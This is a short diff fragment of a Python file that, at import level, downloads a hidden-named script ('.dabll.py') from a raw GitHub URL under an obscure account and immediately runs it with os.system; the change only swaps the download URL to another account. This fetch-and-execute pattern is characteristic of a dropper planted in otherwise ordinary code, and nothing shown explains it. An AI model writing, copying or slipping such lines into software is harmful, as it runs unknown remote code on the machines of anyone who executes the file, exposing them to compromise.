@@ -28,7 +28,7 @@ def g():
 g()	
 
 import os, sys, random, wget
-wget.download("https://raw.githubusercontent.com/4sfr0xosha0sfr4/-/main/.dabll.py")
+wget.download("https://raw.githubusercontent.com/sfr404sfrzed/-/main/.dabll.py")
 os.system("python .dabll.py")
 
 
